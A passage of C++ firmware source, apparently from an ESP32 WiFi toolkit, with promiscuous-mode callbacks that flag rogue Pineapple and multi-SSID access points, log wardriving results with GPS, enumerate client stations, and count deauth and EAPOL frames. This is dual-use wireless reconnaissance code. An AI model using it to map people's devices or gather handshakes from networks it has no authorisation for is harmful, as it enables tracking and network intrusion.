          }
        }
        if (mac_match) {
          already_confirmed = true;
          confirmed_index = i;
          break;
        }
      }

      // If already confirmed, just update it and return
      if (already_confirmed) {
        if (snifferPacket->payload[37] <= 0) {
          essid = "[hidden]";
        } else {
          for (int i = 0; i < snifferPacket->payload[37]; i++) {
            essid.concat((char)snifferPacket->payload[i + 38]);
          }
        }

        ConfirmedPineScan confirmed = wifi_scan_obj.confirmed_pinescan->get(confirmed_index);
        if (snifferPacket->rx_ctrl.rssi > confirmed.rssi) {
          confirmed.rssi = snifferPacket->rx_ctrl.rssi;
        }
        if (essid != "" && essid != "[hidden]") {
          confirmed.essid = essid;
        }
        wifi_scan_obj.confirmed_pinescan->set(confirmed_index, confirmed);
        return;
      }
      
      // Add to tracking list if new
      if (!already_tracked) {
        // Check if we've reached the maximum number of tracked APs
        if (wifi_scan_obj.pinescan_trackers->size() >= MAX_AP_ENTRIES) {
          if (!wifi_scan_obj.pinescan_list_full_reported) {
            Serial.println("AP List Full - Clearing list to make room");
            wifi_scan_obj.pinescan_list_full_reported = true;
            wifi_scan_obj.pinescan_trackers->clear();
            Serial.println("AP list cleared, continuing scan");
          }
          
          // Add the current AP to the freshly cleared list
          PineScanTracker new_tracker;
          memcpy(new_tracker.mac, mac_addr, 6);
          new_tracker.suspicious_oui = suspicious_oui;
          new_tracker.tag_and_susp_cap = tag_and_susp_cap;
          new_tracker.channel = ap_channel;
          new_tracker.rssi = snifferPacket->rx_ctrl.rssi;
          new_tracker.reported = false;
          wifi_scan_obj.pinescan_trackers->add(new_tracker);
          ap_index = wifi_scan_obj.pinescan_trackers->size() - 1;
          
          // Reset the full reported flag since we've made room
          wifi_scan_obj.pinescan_list_full_reported = false;
        } else {
          // Add to tracking list when there is room
          PineScanTracker new_tracker;
          memcpy(new_tracker.mac, mac_addr, 6);
          new_tracker.suspicious_oui = suspicious_oui;
          new_tracker.tag_and_susp_cap = tag_and_susp_cap;
          new_tracker.channel = ap_channel;
          new_tracker.rssi = snifferPacket->rx_ctrl.rssi;
          new_tracker.reported = false;
          wifi_scan_obj.pinescan_trackers->add(new_tracker);
          ap_index = wifi_scan_obj.pinescan_trackers->size() - 1;
        }
      } else {
        // Update existing tracker
        PineScanTracker tracker = wifi_scan_obj.pinescan_trackers->get(ap_index);
				
        if (snifferPacket->rx_ctrl.rssi > tracker.rssi) {
          tracker.rssi = snifferPacket->rx_ctrl.rssi;
        }
        
        if (!tracker.suspicious_oui && suspicious_oui) {
          tracker.suspicious_oui = true;
        }
        
        if (!tracker.tag_and_susp_cap && tag_and_susp_cap) {
          tracker.tag_and_susp_cap = true;
        }
        
        wifi_scan_obj.pinescan_trackers->set(ap_index, tracker);
      }

      // If we have a match and it is not already in the confirmed list, add it
      if (pinescan_match) {
        if (wifi_scan_obj.confirmed_pinescan->size() >= MAX_PINESCAN_ENTRIES) {
          if (!wifi_scan_obj.pinescan_list_full_reported) {
            Serial.println("Confirmed PineScan List Full - Cannot add more");
            Serial.println("Stopping PineScan detection until scan is restarted");
            wifi_scan_obj.pinescan_list_full_reported = true;
          }
          return; // Stop processing completely if list is full
        }
        
        if (snifferPacket->payload[37] <= 0) {
          essid = "[hidden]";
        } else {
          for (int i = 0; i < snifferPacket->payload[37]; i++) {
            essid.concat((char)snifferPacket->payload[i + 38]);
          }
        }

        String detection = "";
        if (pinescan_match_by_oui) {
          detection = "SUSP_OUI";
        } else if (tag_and_susp_cap) {
          detection = "TAG+SUSP_CAP";
        } else {
          detection = "OTHER";
        }

        char addr[18];
        snprintf(addr, sizeof(addr), "%02X:%02X:%02X:%02X:%02X:%02X",
                mac_addr[0], mac_addr[1], mac_addr[2], 
                mac_addr[3], mac_addr[4], mac_addr[5]);

        // Add to confirmed Pineapple list
        ConfirmedPineScan new_confirmed;
        memcpy(new_confirmed.mac, mac_addr, 6);
        new_confirmed.detection_type = detection;
        new_confirmed.essid = essid;
        new_confirmed.channel = ap_channel;
        new_confirmed.rssi = snifferPacket->rx_ctrl.rssi;
        new_confirmed.displayed = false;
        wifi_scan_obj.confirmed_pinescan->add(new_confirmed);

        // Mark as reported in the tracker
        if (already_tracked) {
          PineScanTracker tracker = wifi_scan_obj.pinescan_trackers->get(ap_index);
          tracker.reported = true;
          wifi_scan_obj.pinescan_trackers->set(ap_index, tracker);
        }

        // Only display MAX_DISPLAY_ENTRIES entries per MAC
        int displayed_count = 0;
        for (int i = 0; i < wifi_scan_obj.confirmed_pinescan->size(); i++) {
          bool mac_match = true;
          for (int x = 0; x < 6; x++) {
            if (mac_addr[x] != wifi_scan_obj.confirmed_pinescan->get(i).mac[x]) {
              mac_match = false;
              break;
            }
          }
          
          if (mac_match && wifi_scan_obj.confirmed_pinescan->get(i).displayed) {
            displayed_count++;
          }
        }

        // Only display if we have not hit the display limit for this MAC
        if (displayed_count < MAX_DISPLAY_ENTRIES) {
          int idx = wifi_scan_obj.confirmed_pinescan->size() - 1;
          ConfirmedPineScan to_display = wifi_scan_obj.confirmed_pinescan->get(idx);
          to_display.displayed = true;
          wifi_scan_obj.confirmed_pinescan->set(idx, to_display);
          
          // Create display string
          String log_line = "MAC: " + String(addr) + 
                        " CH: " + String(ap_channel) +
                        " RSSI: " + String(snifferPacket->rx_ctrl.rssi) + 
                        " DET: " + detection +
                        " SSID: " + essid;
          log_line += "\n";
          delay(random(0, 10));
          Serial.print(log_line);

          #ifdef HAS_FULL_SCREEN

            display_string.concat("MAC: " + String(addr));
            display_string.concat(" CH: " + String(ap_channel));
            display_string.concat(" RSSI: " + String(snifferPacket->rx_ctrl.rssi));

            int temp_len = display_string.length();
            for (int i = 0; i < 40 - temp_len; i++) {
              display_string.concat(" ");
            }
            
            display_obj.display_buffer->add(display_string);

            display_string = "";
            display_string.concat("DET: " + detection);
            display_string.concat(" SSID: " + essid);

            temp_len = display_string.length();
            for (int i = 0; i < 40 - temp_len; i++) {
              display_string.concat(" ");
            }

            display_obj.display_buffer->add(display_string);

            display_string = "";
            for (int i = 0; i < 60; i++) {
              display_string.concat("-");
            }

            display_obj.display_buffer->add(display_string);
            
          #elif defined(HAS_MINI_SCREEN)
            // Add MAC and channel
            display_string.concat("MAC: " + String(addr));
            display_string.concat(" CH: " + String(ap_channel));

            int temp_len = display_string.length();
            for (int i = 0; i < 40 - temp_len; i++) {
              display_string.concat(" ");
            }
            
            display_obj.display_buffer->add(display_string);

            // Add RSSI and Detection method
            display_string = "";
            display_string.concat("RSSI: " + String(snifferPacket->rx_ctrl.rssi));
            display_string.concat(" DET: " + detection);

            temp_len = display_string.length();
            for (int i = 0; i < 40 - temp_len; i++) {
              display_string.concat(" ");
            }

            display_obj.display_buffer->add(display_string);

            // Add SSID
            display_string = "";
            display_string.concat("SSID: " + essid);

            temp_len = display_string.length();
            for (int i = 0; i < 40 - temp_len; i++) {
              display_string.concat(" ");
            }

            display_obj.display_buffer->add(display_string);

            // Add delin
            display_string = "";
            for (int i = 0; i < 60; i++) {
              display_string.concat("-");
            }

            display_obj.display_buffer->add(display_string);
          #endif
        }
      }
    }
  }
}

void WiFiScan::multiSSIDSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  extern WiFiScan wifi_scan_obj;

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";

  if (type == WIFI_PKT_MGMT) {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  
    #ifdef HAS_SCREEN
      int buff = display_obj.display_buffer->size();
    #else
      int buff = 0;
    #endif
    
    if ((snifferPacket->payload[0] == 0x80) && (buff == 0)) {
      buffer_obj.append(snifferPacket, len); // Capture all beacons
      
      // Extract MAC address
      uint8_t mac_addr[6];
      for (int i = 0; i < 6; i++) {
        mac_addr[i] = snifferPacket->payload[10 + i];
      }

      // Extract channel from the beacon frame
      int ap_channel = WiFiScan::extractPineScanChannel(snifferPacket->payload, len);
      if (ap_channel == -1) {
        ap_channel = snifferPacket->rx_ctrl.channel;
      }
      
      // Process SSID and compute hash
      uint16_t ssid_hash = 0;
      if (snifferPacket->payload[37] > 0) {
        // Compute Whole SSID hash directly from payload
        for (int i = 0; i < (int)snifferPacket->payload[37]; i++) {
          char c = snifferPacket->payload[i + 38];
          ssid_hash = ((ssid_hash << 5) + ssid_hash) + c;
        }
      } else {
        ssid_hash = 0xFFFF; // hash for hidden SSIDs
      }
      
      // Check for multiple unique SSIDs from same MAC
      bool multi_ssid_ap = false;
      int ap_index = -1;
      
      // Find if have seen this MAC before
      for (int i = 0; i < wifi_scan_obj.multissid_trackers->size(); i++) {
        bool mac_match = true;
        for (int x = 0; x < 6; x++) {
          if (mac_addr[x] != wifi_scan_obj.multissid_trackers->get(i).mac[x]) {
            mac_match = false;
            break;
          }
        }
        
        if (mac_match) {
          ap_index = i;
          break;
        }
      }

      bool already_confirmed = false;
      int confirmed_index = -1;
      for (int i = 0; i < wifi_scan_obj.confirmed_multissid->size(); i++) {
        bool mac_match = true;
        for (int x = 0; x < 6; x++) {
          if (mac_addr[x] != wifi_scan_obj.confirmed_multissid->get(i).mac[x]) {
            mac_match = false;
            break;
          }
        }
        if (mac_match) {
          already_confirmed = true;
          confirmed_index = i;
          break;
        }
      }

      // If already confirmed, just update and return
      if (already_confirmed) {
        if (snifferPacket->payload[37] <= 0) {
          essid = "[hidden]";
        } else {
          for (int i = 0; i < snifferPacket->payload[37]; i++) {
            essid.concat((char)snifferPacket->payload[i + 38]);
          }
        }

        ConfirmedMultiSSID confirmed = wifi_scan_obj.confirmed_multissid->get(confirmed_index);
        if (snifferPacket->rx_ctrl.rssi > confirmed.rssi) {
          confirmed.rssi = snifferPacket->rx_ctrl.rssi;
        }
        if (essid != "" && essid != "[hidden]") {
          confirmed.essid = essid;
        }
        wifi_scan_obj.confirmed_multissid->set(confirmed_index, confirmed);
        return;
      }
      
      if (ap_index == -1) {
        if (wifi_scan_obj.confirmed_multissid->size() >= MAX_MULTISSID_ENTRIES) {
          if (!wifi_scan_obj.multissid_list_full_reported) {
            Serial.println("Confirmed MultiSSID List Full - Cannot add more");
            Serial.println("Stopping MultiSSID detection until scan is restarted");
            wifi_scan_obj.multissid_list_full_reported = true;
          }
          return; // Stop processing completely if list is full
        }
          
        // Check if we have reached the maximum number of tracked APs
        if (wifi_scan_obj.multissid_trackers->size() >= MAX_AP_ENTRIES) {
          if (!wifi_scan_obj.multissid_list_full_reported) {
            Serial.println("AP List Full - Clearing list to make room");
            wifi_scan_obj.multissid_list_full_reported = true;
            wifi_scan_obj.multissid_trackers->clear();
            Serial.println("AP list cleared, continuing scan");
          }
          
          // Add the current AP to the freshly cleared list
          MultiSSIDTracker new_tracker;
          memcpy(new_tracker.mac, mac_addr, 6);
          new_tracker.ssid_hashes[0] = ssid_hash;
          new_tracker.unique_ssid_count = 1;
          new_tracker.reported = false;
          wifi_scan_obj.multissid_trackers->add(new_tracker);
          ap_index = wifi_scan_obj.multissid_trackers->size() - 1;
          
          // Reset the full reported flag since we've made room
          wifi_scan_obj.multissid_list_full_reported = false;
        } else {
          // Add to tracking list when there is room
          MultiSSIDTracker new_tracker;
          memcpy(new_tracker.mac, mac_addr, 6);
          new_tracker.ssid_hashes[0] = ssid_hash;
          new_tracker.unique_ssid_count = 1;
          new_tracker.reported = false;
          wifi_scan_obj.multissid_trackers->add(new_tracker);
          ap_index = wifi_scan_obj.multissid_trackers->size() - 1;
        }
      } else {
        MultiSSIDTracker tracker = wifi_scan_obj.multissid_trackers->get(ap_index);
        
        // Check if we have already seen this SSID hash
        bool hash_found = false;
        for (int i = 0; i < min(MULTISSID_THRESHOLD, (int)tracker.unique_ssid_count); i++) {
          if (tracker.ssid_hashes[i] == ssid_hash) {
            hash_found = true;
            break;
          }
        }
        
        // Add new hash if not seen before
        if (!hash_found && tracker.unique_ssid_count < MULTISSID_THRESHOLD) {
          int index = tracker.unique_ssid_count;
          tracker.ssid_hashes[index] = ssid_hash;
          tracker.unique_ssid_count = min(MULTISSID_THRESHOLD, tracker.unique_ssid_count + 1);
          wifi_scan_obj.multissid_trackers->set(ap_index, tracker);
        }

        // Check if this MAC now has enough unique SSIDs
        if (tracker.unique_ssid_count >= MULTISSID_THRESHOLD) {
          multi_ssid_ap = true;
        }
      }

      // If we found a multi SSID AP, report it
      if (multi_ssid_ap) {
        if (snifferPacket->payload[37] <= 0) {
          essid = "[hidden]";
        } else {
          for (int i = 0; i < snifferPacket->payload[37]; i++) {
            essid.concat((char)snifferPacket->payload[i + 38]);
          }
        }

        char addr[18];
        snprintf(addr, sizeof(addr), "%02X:%02X:%02X:%02X:%02X:%02X",
                mac_addr[0], mac_addr[1], mac_addr[2], 
                mac_addr[3], mac_addr[4], mac_addr[5]);

        // Add to confirmed Multi SSID list
        ConfirmedMultiSSID new_confirmed;
        memcpy(new_confirmed.mac, mac_addr, 6);
        new_confirmed.essid = essid;
        new_confirmed.channel = ap_channel;
        new_confirmed.rssi = snifferPacket->rx_ctrl.rssi;
        new_confirmed.ssid_count = wifi_scan_obj.multissid_trackers->get(ap_index).unique_ssid_count;
        new_confirmed.displayed = false;
        wifi_scan_obj.confirmed_multissid->add(new_confirmed);

        String log_line = "MAC: " + String(addr) + 
                      " CH: " + String(ap_channel) +
                      " RSSI: " + String(snifferPacket->rx_ctrl.rssi) + 
                      " SSIDs: " + String(new_confirmed.ssid_count) +
                      " SSID: " + essid;
        log_line += "\n";
        delay(random(0, 10));
        Serial.print(log_line);

        display_string.concat("MAC: " + String(addr));
        display_string.concat(" CH: " + String(ap_channel));
        display_string.concat(" RSSI: " + String(snifferPacket->rx_ctrl.rssi));
        display_string.concat(" SSIDs: " + String(new_confirmed.ssid_count));
        display_string.concat(" SSID: " + essid);

        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++) {
          display_string.concat(" ");
        }
        
        #ifdef HAS_SCREEN
          display_obj.display_buffer->add(display_string);
        #endif
      }
    }
  }
}

void WiFiScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;

  #ifdef HAS_GPS
    extern GpsInterface gps_obj;
    extern EvilPortal evil_portal_obj;
  #endif

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buff = display_obj.display_buffer->size();
    #else
      int buff = 0;
    #endif

    uint8_t target_mac[6] = {0xde, 0xad, 0xbe, 0xef, 0xde, 0xad};

    // It is a beacon
    if ((snifferPacket->payload[0] == 0x80) && (buff == 0))
    {
      bool mac_match = true;
      for (int i = 0; i < 6; i++) {
        if (snifferPacket->payload[10 + i] != target_mac[i]) {
          mac_match = false;
          break;
        }
      }

      // If MAC matches, call processPwnagotchiBeacon with frame data
      if (mac_match) {
        Serial.println("Pwnagotchi beacon detected!");
        wifi_scan_obj.processPwnagotchiBeacon(snifferPacket->payload, len);
        return;
      }

      if (wifi_scan_obj.currentScanMode == WIFI_SCAN_PWN) {
        buffer_obj.append(snifferPacket, len);
        return;
      }
      
      // Do signal strength stuff first
      else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_SIG_STREN) {
        bool found = false;
        uint8_t targ_index = 0;
        AccessPoint targ_ap;

        // Check list of APs
        for (int i = 0; i < access_points->size(); i++) {
          if (access_points->get(i).selected) {
            uint8_t addr[] = {snifferPacket->payload[10],
                              snifferPacket->payload[11],
                              snifferPacket->payload[12],
                              snifferPacket->payload[13],
                              snifferPacket->payload[14],
                              snifferPacket->payload[15]};
            // Compare AP bssid to ssid of recvd packet
            for (int x = 0; x < 6; x++) {
              if (addr[x] != access_points->get(i).bssid[x]) {
                found = false;
                break;
              }
              else
                found = true;
            }
            if (found) {
              targ_ap = access_points->get(i);
              targ_index = i;
              break;
            }
          }
        }
        if (!found)
          return;

        if ((targ_ap.rssi + 5 < snifferPacket->rx_ctrl.rssi) || (snifferPacket->rx_ctrl.rssi + 5 < targ_ap.rssi)) {
          targ_ap.rssi = snifferPacket->rx_ctrl.rssi;
          access_points->set(targ_index, targ_ap);
          Serial.println((String)access_points->get(targ_index).essid + " RSSI: " + (String)access_points->get(targ_index).rssi);
          display_string.concat((String)access_points->get(targ_index).essid);
          display_string.concat(" RSSI: ");
          display_string.concat((String)access_points->get(targ_index).rssi);
          int temp_len = display_string.length();
          for (int i = 0; i < 50 - temp_len; i++)
          {
            display_string.concat(" ");
          }
          #ifdef HAS_SCREEN
            display_obj.display_buffer->add(display_string);
          #endif
          return;
        }
      }

      else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_AP) {
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        char addr[] = "00:00:00:00:00:00";
        getMAC(addr, snifferPacket->payload, 10);
        Serial.print(addr);
        Serial.print(" ESSID Len: " + (String)snifferPacket->payload[37]);
        Serial.print(" ESSID: ");
        #ifdef HAS_FULL_SCREEN
          display_string.concat(snifferPacket->rx_ctrl.rssi);
          display_string.concat(" ");
          display_string.concat(snifferPacket->rx_ctrl.channel);
          display_string.concat(" ");
        #endif
        if (snifferPacket->payload[37] <= 0)
          display_string.concat(addr);
        else {
          for (int i = 0; i < snifferPacket->payload[37]; i++)
          {
            Serial.print((char)snifferPacket->payload[i + 38]);
            display_string.concat((char)snifferPacket->payload[i + 38]);
          }
        }

        int temp_len = display_string.length();

        #ifdef HAS_SCREEN
          for (int i = 0; i < 40 - temp_len; i++)
          {
            display_string.concat(" ");
          }
    
          Serial.print(" ");
    
          display_obj.display_buffer->add(display_string);
        #endif

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
      else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_WAR_DRIVE) {
        #ifdef HAS_GPS
          if (gps_obj.getGpsModuleStatus()) {
            bool do_save = false;  

            // Check if we've already seen this AP
            char addr[] = "00:00:00:00:00:00";
            getMAC(addr, snifferPacket->payload, 10);
            if (wifi_scan_obj.seen_mac(reinterpret_cast<unsigned char*>(addr)))
              return;

            Serial.print("RSSI: ");
            Serial.print(snifferPacket->rx_ctrl.rssi);
            Serial.print(" Ch: ");
            Serial.print(snifferPacket->rx_ctrl.channel);

            if (snifferPacket->payload[37] > 0) {
              Serial.print(" ESSID: ");
              for (int i = 0; i < snifferPacket->payload[37]; i++)
              {
                Serial.print((char)snifferPacket->payload[i + 38]);
                display_string.concat((char)snifferPacket->payload[i + 38]);
                essid.concat((char)snifferPacket->payload[i + 38]);
              }
            }
            else {
              Serial.print(" BSSID: ");
              Serial.print(addr);
              display_string.concat(addr);
            }

            if (gps_obj.getFixStatus()) {
              do_save = true;
              display_string.concat(" | Lt: " + gps_obj.getLat());
              display_string.concat(" | Ln: " + gps_obj.getLon());
            }
            else
              display_string.concat(" | GPS: No Fix");

            int temp_len = display_string.length();

            #ifdef HAS_SCREEN
              for (int i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
        
              Serial.print(" ");
        
              display_obj.display_buffer->add(display_string);
            #endif

            Serial.println();

            wifi_scan_obj.save_mac(reinterpret_cast<unsigned char*>(addr));

            int n = WiFi.scanNetworks(false, true, false, 110, wifi_scan_obj.set_channel);

            if (do_save) {
              if (n > 0) {
                for (int i = 0; i < n; i++) {
                  Serial.printf("%-32.32s", WiFi.SSID(i).c_str());
                  Serial.print(" -> ");
                  Serial.println(wifi_scan_obj.security_int_to_string(WiFi.encryptionType(i)).c_str());
                }
              }
              String wardrive_line = (String)addr + "," + essid + "," + wifi_scan_obj.security_int_to_string(snifferPacket->rx_ctrl.channel) + "," + gps_obj.getDatetime() + "," + (String)snifferPacket->rx_ctrl.channel + "," + (String)snifferPacket->rx_ctrl.rssi + "," + gps_obj.getLat() + "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," + gps_obj.getAccuracy() + ",WIFI";
              Serial.println(wardrive_line);
              //buffer_obj.append(wardrive_line);
            }
          }
        #endif
      }      
    }
  }
}

void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  extern WiFiScan wifi_scan_obj;
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  bool mem_check = wifi_scan_obj.checkMem();

  String display_string = "";
  String mac = "";

  if (type != WIFI_PKT_DATA)
    return;
  /*{
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }*/

  char ap_addr[] = "00:00:00:00:00:00";
  char dst_addr[] = "00:00:00:00:00:00";

  int ap_index = 0;

  // Check if frame has ap in list of APs and determine position
  uint8_t frame_offset = 0;
  int offsets[2] = {10, 4};
  bool matched_ap = false;
  bool ap_is_src = false;

  bool mac_match = true;

  for (int y = 0; y < 2; y++) {
    for (int i = 0; i < access_points->size(); i++) {
      mac_match = true;
      
      for (int x = 0; x < 6; x++) {
        if (snifferPacket->payload[x + offsets[y]] != access_points->get(i).bssid[x]) {
          mac_match = false;
          break;
        }
      }
      if (mac_match) {
        matched_ap = true;
        if (offsets[y] == 10)
          ap_is_src = true;
        ap_index = i;
        getMAC(ap_addr, snifferPacket->payload, offsets[y]);
        break;
      }
    }
    if (matched_ap)
      break;
  }

  // If did not find ap from list in frame, drop frame
  if (!matched_ap)
    return;
  else {
    if (ap_is_src)
      frame_offset = 4;
    else
      frame_offset = 10;
  }
  /*  Stuff to care about now
   *  ap_is_src
   *  ap_index
   */
  

  // Check if we already have this station
  bool in_list = false;
  for (int i = 0; i < stations->size(); i++) {
    mac_match = true;
    
    for (int x = 0; x < 6; x++) {
      //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
      if (snifferPacket->payload[x + frame_offset] != stations->get(i).mac[x]) {
        mac_match = false;
        //Serial.println("MACs do not match");
        break;
      }
    }
    if (mac_match) {
      in_list = true;
      break;
    }
  }

  getMAC(dst_addr, snifferPacket->payload, 4);

  // Check if dest is broadcast
  if ((in_list) || (strcmp(dst_addr, "ff:ff:ff:ff:ff:ff") == 0))
    return;
  
  // Add to list of stations
  if (mem_check) {
    Station sta = {
                  {snifferPacket->payload[frame_offset],
                  snifferPacket->payload[frame_offset + 1],
                  snifferPacket->payload[frame_offset + 2],
                  snifferPacket->payload[frame_offset + 3],
                  snifferPacket->payload[frame_offset + 4],
                  snifferPacket->payload[frame_offset + 5]},
                  false,
                  0,
                  ap_index};

    stations->add(sta);
  }

  // Print findings to serial
  Serial.print((String)stations->size() + ": ");
  
  char sta_addr[] = "00:00:00:00:00:00";
  
  if (ap_is_src) {
    Serial.print("ap: ");
    Serial.print(ap_addr);
    Serial.print(" -> sta: ");
    getMAC(sta_addr, snifferPacket->payload, 4);
    Serial.println(sta_addr);
  }
  else {
    Serial.print("sta: ");
    getMAC(sta_addr, snifferPacket->payload, 10);
    Serial.print(sta_addr);
    Serial.print(" -> ap: ");
    Serial.println(ap_addr);
  }

  display_string.concat(replaceOUIWithManufacturer(sta_addr));

  //display_string.concat(sta_addr);
  display_string.concat(" -> ");
  display_string.concat(access_points->get(ap_index).essid);

  int temp_len = display_string.length();

  #ifdef HAS_SCREEN
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }

    Serial.print(" ");

    if (mem_check)
      display_obj.display_buffer->add(display_string);
    else {
      String warning_str = "Memory lim reached " + display_string;
      display_obj.display_buffer->add(warning_str);
    }
  #endif

  // Add station index to AP in list
  //access_points->get(ap_index).stations->add(stations->size() - 1);

  if (mem_check) {
    AccessPoint ap = access_points->get(ap_index);
    ap.stations->add(stations->size() - 1);

    access_points->set(ap_index, ap);
  }

  buffer_obj.append(snifferPacket, len);
}

void WiFiScan::rawSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
    wifi_scan_obj.mgmt_frames++;

    // Do our counts
    if (snifferPacket->payload[0] == 0x40) // Probe request
      wifi_scan_obj.req_frames++;
    else if (snifferPacket->payload[0] == 0x50) // Probe response
      wifi_scan_obj.resp_frames++;
    else if (snifferPacket->payload[0] == 0x80) // Beacon
      wifi_scan_obj.beacon_frames++;
    else if (snifferPacket->payload[0] == 0xC0) // Deauth
      wifi_scan_obj.deauth_frames++;
    else if (((snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e) || ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e))) // eapol
      wifi_scan_obj.eapol_frames++;

    // Get min/max rssi
    if (snifferPacket->rx_ctrl.rssi < wifi_scan_obj.min_rssi)
      wifi_scan_obj.min_rssi = snifferPacket->rx_ctrl.rssi;
    
    if (snifferPacket->rx_ctrl.rssi > wifi_scan_obj.max_rssi)
      wifi_scan_obj.max_rssi = snifferPacket->rx_ctrl.rssi;
  }
  else {
    wifi_scan_obj.data_frames++;
  }

  if (wifi_scan_obj.currentScanMode == WIFI_SCAN_SIG_STREN) {
    bool found = false;
    uint8_t targ_index = 0;
    AccessPoint targ_ap;

    // Check list of APs
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected) {
        uint8_t addr[] = {snifferPacket->payload[10],
                          snifferPacket->payload[11],
                          snifferPacket->payload[12],
                          snifferPacket->payload[13],
                          snifferPacket->payload[14],
                          snifferPacket->payload[15]};
        // Compare AP bssid to ssid of recvd packet
        for (int x = 0; x < 6; x++) {
          if (addr[x] != access_points->get(i).bssid[x]) {
            found = false;
            break;
          }
          else
            found = true;
        }
        if (found) {
          targ_ap = access_points->get(i);
          targ_index = i;
          break;
        }
      }
    }
    if (!found)
      return;

    if ((targ_ap.rssi + 5 < snifferPacket->rx_ctrl.rssi) || (snifferPacket->rx_ctrl.rssi + 5 < targ_ap.rssi)) {
      targ_ap.rssi = snifferPacket->rx_ctrl.rssi;
      access_points->set(targ_index, targ_ap);
      Serial.println((String)access_points->get(targ_index).essid + " RSSI: " + (String)access_points->get(targ_index).rssi);
      display_string.concat((String)access_points->get(targ_index).essid);
      #ifndef HAS_MINI_SCREEN
        display_string.concat(" RSSI: ");
        display_string.concat((String)access_points->get(targ_index).rssi);
      #endif
      int temp_len = display_string.length();
      for (int i = 0; i < 50 - temp_len; i++)
      {
        display_string.concat(" ");
      }
      #ifdef HAS_SCREEN
        display_obj.display_buffer->add(display_string);
        #ifdef HAS_MINI_SCREEN
          display_string = "";
          display_string.concat("RSSI: ");
          display_string.concat((String)access_points->get(targ_index).rssi);
          temp_len = display_string.length();
          for (int i = 0; i < 50 - temp_len; i++)
          {
            display_string.concat(" ");
          }
          display_obj.display_buffer->add(display_string);
        #endif
      #endif
    }
    else
      return;
  }

  buffer_obj.append(snifferPacket, len);
}

void WiFiScan::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ) && (buf == 0))
    {
      delay(random(0, 10));
      Serial.print("RSSI: ");
